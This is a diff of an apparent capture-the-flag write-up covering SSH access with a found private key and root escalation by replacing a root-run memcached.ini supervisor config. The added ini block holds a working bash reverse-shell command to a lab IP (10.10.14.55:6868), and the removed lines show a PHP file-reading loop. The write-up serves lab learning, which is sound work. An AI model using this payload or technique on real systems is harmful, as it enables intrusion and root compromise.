@@ -152,9 +152,19 @@ This can be used to add the key to the ```authorized_keys```. However, when conn
 
 Is there a way to escape?
 
-foreach($f as $filename){
-    echo $filename;
-    echo file_get_contents($filename);
-}
+After some trial and error I found that the id_rsa key in the ```berlin``` directory has been authorised to login with ```professor```. This gives me a ssh terminal on the box.
 
-$fileList = glob('/home/dali/.config/*');
+# ROOT
+
+Root was much easier than I thought. In the /home directory there is a ```memcached.ini``` file that is being run with a cron job of sorts.
+
+You cannot write to this file but can rename it and replace it with another file. This will then be run with root privileges. Replacing the command will give you a root shell.
+
+Exploit is below:
+
+```ini
+[program:memcached]
+command = sudo /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.55/6868 0>&1'
+```
+
+This gave us a reverse shell as root.
